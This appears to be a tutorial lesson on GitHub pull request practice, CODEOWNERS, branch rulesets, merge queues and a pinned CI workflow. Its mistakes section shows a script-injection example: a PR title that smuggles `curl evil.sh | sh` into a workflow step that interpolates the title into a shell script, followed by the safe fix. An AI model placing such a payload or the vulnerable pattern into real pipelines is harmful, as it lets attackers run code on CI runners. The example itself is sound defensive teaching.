---
title: Pull requests and a protected main
tech: Git, GitHub
version: GitHub.com (Nov 2026), gh CLI
date: 2026-11-01
covers: [11, 12]
---
# Pull requests and a protected main
[← Overview](00-overview.md)

## Why it matters
- A 1,500-line PR gets "LGTM" in four minutes, and the bug in line 900 ships.
- Someone pushes straight to `main` from a laptop with failing tests, and the next deploy takes production down.
- Two PRs each pass CI, then break `main` together after both merge. Each was tested against an old `main`.

## Concepts

### A PR that gets merged
- **Small:** aim for under ~400 changed lines. Review quality drops sharply above that.
- **One concern:** a refactor and a feature are two PRs. Use stacked PRs for big features.
- **Titled like a commit:** with squash merge, the PR title becomes the commit subject on `main`. `feat(cart): apply discount codes`, not "Ticket 123".
- **Described:** what and why, how to test, risk, rollback. Link the issue: `Closes #123`.
- **Self-reviewed:** read your own diff on GitHub before you request anyone.
- **Draft while unfinished:** `gh pr create --draft`, then `gh pr ready`.

Clean the branch **before** requesting review (lesson 04). **During** review, push new commits (fixups) so reviewers see only what changed. Squash merge folds them away at the end.

### Reviewing
- Review within one working day; a waiting PR blocks someone.
- Label intent: `blocking:`, `question:`, `nit:`, `suggestion:`. Use GitHub suggestions for small fixes.
- Check behaviour, tests, security, naming, and what is missing (error paths, docs), not formatting. Tools handle formatting.

also seen: Conventional Comments, a fuller label scheme.

### CODEOWNERS
`.github/CODEOWNERS` maps paths to required reviewers. The **last** matching pattern wins.
```text
# Default owner for everything
*                       @you
# Infra and CI need the platform team
/.github/               @acme/platform
/infra/                 @acme/platform
# Auth code needs security review
/src/auth/              @acme/security @you
```
Owners need write access. CODEOWNERS only *requests* their review; a ruleset makes it *required*.

### Rulesets
Rulesets are GitHub's current way to protect branches and tags. They replace classic branch protection for new setups.
- Several rulesets can target the same branch. They stack, and the strictest rule wins.
- Targets: `~DEFAULT_BRANCH`, patterns like `release/**`, or tags like `v*`.
- A bypass list lets named roles, teams, or apps skip a ruleset (for example a release bot).
- Export and import as JSON, so the setup can be reviewed and copied.
- Availability: public repos on GitHub Free; private repos need Pro, Team, or Enterprise.

Recommended ruleset for `main`:
| Rule | Setting | Prevents |
|:--|:--|:--|
| Restrict deletions | on | deleting `main` |
| Block force pushes | on | rewriting shared history |
| Require a pull request | approvals 1 (0 if solo), dismiss stale approvals, require conversation resolution, code owner review | unreviewed changes |
| Allowed merge methods | squash | messy history on main |
| Require status checks | `check` from GitHub Actions; require up to date | merging red or stale PRs |
| Require linear history | on | merge commits |
| Require signed commits | on (lesson 06) | impersonated commits |

Solo repo: GitHub won't let you approve your own PR. Keep "require a pull request" with 0 approvals; CI still gates every change.

### Merge queue
"Require branches to be up to date" makes PRs merge one at a time and re-run CI after each merge. A **merge queue** tests each PR combined with the PRs ahead of it, then merges the ones that pass.
- Your workflow must also run on the `merge_group` event, or queued PRs wait forever.
- Available for public repos owned by an **organization**, and private org repos on Enterprise Cloud. Not on personal-account repos.

### Repo settings that go with the ruleset
- Allow squash merging only. Default message: **pull request title and description**.
- Allow auto-merge (`gh pr merge --auto --squash` merges when checks pass).
- Always suggest updating pull request branches.
- Automatically delete head branches.

## Example: CI that the ruleset requires
`.github/workflows/ci.yml`
```yaml
name: CI
on:
  pull_request:
  merge_group:            # required if you use a merge queue
  push:
    branches: [main]

permissions:
  contents: read          # least privilege for GITHUB_TOKEN

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  check:                  # this job's name is the status check you require
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - uses: actions/setup-node@949feb2413d6458794dcd2491c4babbbce0c15c1 # v7.1.0
        with:
          node-version: 26
      - run: node --test
```
Actions are pinned to a full commit SHA, with the version in a comment. A tag can be moved to malicious code; a SHA can't.

## Example: the PR loop with gh
```bash
git switch -c feat/discount-codes
# ...commits...
git push
gh pr create --draft --fill --title "feat(cart): apply discount codes"
gh pr checks --watch
gh pr ready
gh pr merge --auto --squash --delete-branch

# As a reviewer
gh pr checkout 42
gh pr diff
gh pr review 42 --approve --body "Tested locally; LGTM"

gh ruleset check main   # which rules apply to main right now
```

`.github/pull_request_template.md`
```markdown
## What and why
<!-- One paragraph. Link the issue: Closes #123 -->

## How to test
1.

## Risk and rollback
<!-- What could break? How do we undo it? Revert this PR / flag off / migration down -->

## Checklist
- [ ] Tests added or updated
- [ ] Docs updated
- [ ] No secrets, no debug logs
```

## Production patterns
- **The ruleset is the policy; CI is the enforcement.** Hooks are a convenience.
- **Require the exact job name** you see on a PR's checks list, and pick GitHub Actions as its source, so another app can't fake a green check.
- **Check the PR title in CI** when you squash merge, because the title becomes history.
- **Keep the bypass list empty or tiny.** Admin bypass "just this once" becomes the normal path.
- **Export rulesets to JSON** and keep them in an infra repo, so changes are reviewed like code.

## Mistakes
Wrong: required check name doesn't match the job, so PRs wait for a check that never reports.
```yaml
jobs:
  test:          # ruleset requires "check"
```
Right:
```yaml
jobs:
  check:
```

Wrong: interpolate PR data into a shell script. A PR title like `"; curl evil.sh | sh; "` runs on your runner.
```yaml
- run: echo "${{ github.event.pull_request.title }}" | grep -E '^feat'
```
Right: pass it through an environment variable; the shell treats it as data.
```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: printf '%s\n' "$PR_TITLE" | grep -E '^feat'
```

Wrong: enable a merge queue but trigger CI only on `pull_request`.
Right: `on: [pull_request, merge_group]`.

Wrong: one PR titled "Sprint 14 work" with 38 files.
Right: four PRs, each with a Conventional Commit title, each under ~400 lines.

## Check yourself
1. Why does a PR's title matter more with squash merge than with merge commits?
2. Two PRs both passed CI and merged; `main` is now red. Which setting or feature prevents this?
3. A teammate wants to add themselves to the ruleset bypass list "to save time". What is the risk?

<details>
<summary>Answers</summary>

1. The squash commit's subject is the PR title (with the repo's default message setting). It is what `git log`, changelogs, and SemVer tooling read.
2. "Require branches to be up to date before merging" (tests each PR on the latest `main`), or a merge queue, which does the same thing in batches without serializing everyone.
3. Their pushes skip review and checks, so one bad push reaches production. It also hides who changed what and why. Bypass should be rare, logged, and limited to automation or break-glass.
</details>

## Sources
- [GitHub — About rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets)
- [GitHub — Available rules for rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/available-rules-for-rulesets)
- [GitHub — Merging a PR with a merge queue](https://docs.github.com/en/pull-requests/how-tos/merge-and-close-pull-requests/merging-a-pull-request-with-a-merge-queue)
- [GitHub — About code owners](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners)
- [GitHub — Script injections in Actions](https://docs.github.com/en/actions/concepts/security/script-injections)
- [gh pr](https://cli.github.com/manual/gh_pr) · [gh ruleset](https://cli.github.com/manual/gh_ruleset)
- [Google Engineering Practices — Small CLs](https://google.github.io/eng-practices/review/developer/small-cls.html)
